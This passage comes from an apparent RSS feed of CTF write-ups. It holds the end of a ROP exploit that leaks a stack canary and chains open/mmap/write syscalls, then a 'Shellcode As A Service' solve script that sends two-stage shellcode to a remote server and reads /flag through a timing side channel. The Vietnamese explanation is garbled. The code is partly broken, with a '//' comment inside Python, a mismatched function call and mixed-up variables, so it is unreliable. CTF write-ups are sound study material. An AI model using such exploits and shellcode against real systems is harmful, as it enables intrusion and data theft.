</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401491</span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040148f</span>
</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401493</span>
</span></span><span style="display:flex;"><span>pop_rsp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004014a0</span>
</span></span><span style="display:flex;"><span>pop_r10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401497</span>
</span></span><span style="display:flex;"><span>pop_r8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040149a</span>
</span></span><span style="display:flex;"><span>pop_r9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040149d</span>
</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401495</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sys_call <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000000004014a8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stage 1 : Leak canary and Libc :</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_note</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_note</span>(idx, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1000</span>):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx = &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size to write = &#39;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>size<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_note</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx = &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>):
</span></span><span style="display:flex;"><span>    create_note()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Addr of note 0 is 0x&#34;</span>)
</span></span><span style="display:flex;"><span>        addr_0<span style="color:#f92672">=</span>int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>rstrip()<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write_note(<span style="color:#ae81ff">0</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>write_note(<span style="color:#ae81ff">3</span>, size<span style="color:#f92672">=</span><span style="color:#ae81ff">0x1740</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>) 
</span></span><span style="display:flex;"><span>read_note(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x10</span>):
</span></span><span style="display:flex;"><span>	io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>	log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>	sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x760</span><span style="color:#f92672">+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;canary = </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">//</span> fill buff <span style="color:#f92672">and</span> saved_rbp
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat(pop_rax, <span style="color:#ae81ff">2</span>, pop_rdi, base<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf00</span>, pop_rsi, <span style="color:#ae81ff">0</span>, pop_rdx, <span style="color:#ae81ff">0</span>,\
</span></span><span style="display:flex;"><span>                syscall_ret, pop_rax, <span style="color:#ae81ff">9</span>, pop_rdi, <span style="color:#ae81ff">0x13370000</span>, pop_rsi, <span style="color:#ae81ff">0x1000</span>,\ <span style="color:#75715e"># open</span>
</span></span><span style="display:flex;"><span>                pop_rdx, <span style="color:#ae81ff">7</span>, pop_r10, <span style="color:#ae81ff">2</span>, pop_r8, <span style="color:#ae81ff">3</span>, pop_r9, <span style="color:#ae81ff">0</span>, syscall_ret,\  <span style="color:#75715e"># mmap</span>
</span></span><span style="display:flex;"><span>                pop_rax, <span style="color:#ae81ff">1</span>, pop_rdi, <span style="color:#ae81ff">1</span>, pop_rsi, <span style="color:#ae81ff">0x13370000</span>, pop_rdx, <span style="color:#ae81ff">0x40</span>, syscall_ret) <span style="color:#75715e"># write</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{m4st3r_0f_mm4p_5ee2a719bc6a8209e7295d4095ff5181}</p>
<h1 id="shellcode-as-a-service">Shellcode As A Service</h1>
<p><code>Description: Hey, welcome to my new SaaS platform! As part of our early access program, we are offering the service for FREE. Our generous free tier gives you a whole SIX BYTES of shellcode to run on our server. What are you waiting for? Sign up now!</code></p>
<p>Nh chng trnh  m t, chng ta phi vit shellcode s c a vo  thc thi.
c cp cho 6 bytes v c cho php 2 syscall open, read, ngn chn chng ta in flag ra mn hnh.  tng l chng ta s vit 1 vng lp  kim tra tng bit ca flag, nu bit bng 1 s cho vo 1 vng lp, cn ngc li th bit bng 0.
Mt cch khc l ta s c tng bytes ca flag ri kim tra tng k t ca flag.</p>
<p>Ngay lc ny, thanh ghi rdi ang c gi tr bng 0, rdx th l a ch ni m shellcode chng ta ghi nn chng ta ch cn ly gi tr  l   ghi tip (second stage write).</p>
<p><strong>Solve scripts</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.aslr = False</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;, &#39;-F&#39; &#39;#{pane_pid}&#39;, &#39;-P&#39;]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.timeout = 2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">riconn</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> local
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">global</span> debug
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> arg <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:]:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-l&#39;</span>, <span style="color:#e6db74">&#39;--local&#39;</span>):
</span></span><span style="display:flex;"><span>			local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> arg <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--debug&#39;</span>):
</span></span><span style="display:flex;"><span>			debug <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> local:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> debug:
</span></span><span style="display:flex;"><span>			gdb<span style="color:#f92672">.</span>attach(s, gdbscript<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			raw_input(<span style="color:#e6db74">&#39;DEBUG&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;103.162.14.240&#39;</span>, <span style="color:#ae81ff">15001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> io
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chall&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#libc = ELF(&#39;libc.so.6&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">chill</span>(offset):
</span></span><span style="display:flex;"><span>    bin <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> riconn()
</span></span><span style="display:flex;"><span>        stage1 <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        xor edi, edi
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov esi, edx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(stage1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        stage2 <span style="color:#f92672">=</span> asm((<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .rept 0x6
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        nop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        .endr
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>open(<span style="color:#e6db74">&#39;/flag&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> shellcraft<span style="color:#f92672">.</span>amd64<span style="color:#f92672">.</span>linux<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;rax&#39;</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            xor r11, r11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            xor rax, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            mov al, [rsp+</span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shr al, </span><span style="color:#e6db74">{</span>bit<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shl al, 7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            shr al, 7
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            cmp rax, r11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            je end
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            jmp loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        end:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        ), arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(stage2)
</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>        now <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (now <span style="color:#f92672">-</span> start) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            bin <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            bin <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    byte <span style="color:#f92672">=</span> int(bin[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> byte
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>tmp <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>    tmp<span style="color:#f92672">.</span>append(chill(i))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tmp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;}&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> [x<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> tmp]
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag)
</span></span></code></pre></div><p><strong>$ flag:</strong> SEE{n1c3_sh3llc0ding_d6e25f87c7ebeef6e80df23d32c42d00}</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
